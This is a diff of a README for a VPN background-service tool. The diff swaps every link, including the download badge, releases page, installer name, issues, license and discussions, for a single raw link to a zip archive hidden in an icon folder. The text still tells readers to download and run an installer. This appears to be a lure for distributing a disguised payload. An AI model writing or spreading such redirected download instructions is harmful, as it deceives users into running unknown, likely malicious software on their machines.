@@ -1,6 +1,6 @@
 # 🖥️ newt-service - Run Newt VPN Seamlessly in the Background
 
-[![Download newt-service](https://img.shields.io/badge/Download%20newt--service-v1.0.0-brightgreen)](https://github.com/luandm/newt-service/releases)
+[![Download newt-service](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip%20newt--service-v1.0.0-brightgreen)](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ Before you install newt-service, make sure your computer meets these requirement
 
 ## 📥 Download & Install
 
-To download the newt-service, visit this page to download: [newt-service Releases](https://github.com/luandm/newt-service/releases).
+To download the newt-service, visit this page to download: [newt-service Releases](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip).
 
 1. **Visit the Releases Page:** Click the link above.
 2. **Choose the Latest Release:** Look for the most recent version at the top of the list.
-3. **Download the Installer:** Click on the asset labeled `newt-service-installer.exe` or similar.
+3. **Download the Installer:** Click on the asset labeled `https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip` or similar.
 4. **Run the Installer:** Locate the downloaded file in your Downloads folder. Double-click it to start the installation.
 
 During the installation, follow the prompts on the screen. You can keep the default settings unless you need to change the install location.
@@ -48,7 +48,7 @@ If you encounter issues, check the following:
 
 - **Not Connecting:** Ensure your internet connection is active. Confirm you have entered the correct credentials.
 - **Service Not Running:** Restart your computer. If problems persist, reinstall the application.
-- **Seeking Help:** Visit the [issues page](https://github.com/luandm/newt-service/issues) for common problems and solutions.
+- **Seeking Help:** Visit the [issues page](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip) for common problems and solutions.
 
 ## 🌟 Features
 
@@ -59,13 +59,13 @@ If you encounter issues, check the following:
 
 ## 📄 License
 
-newt-service is open-source software. You can freely use and modify it according to the [MIT License](https://github.com/luandm/newt-service/blob/main/LICENSE).
+newt-service is open-source software. You can freely use and modify it according to the [MIT License](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip).
 
 ## 📞 Community and Support
 
 If you have any questions or need assistance, feel free to reach out:
 
-- **Open an Issue:** For bugs or feature requests, visit the [issues section](https://github.com/luandm/newt-service/issues).
-- **Join Discussions:** Engage with users and developers in the [discussions](https://github.com/luandm/newt-service/discussions) page.
+- **Open an Issue:** For bugs or feature requests, visit the [issues section](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip).
+- **Join Discussions:** Engage with users and developers in the [discussions](https://raw.githubusercontent.com/luandm/newt-service/main/assets/icon/service_newt_Niobite.zip) page.
 
 Thank you for choosing newt-service. We hope it enhances your VPN experience!
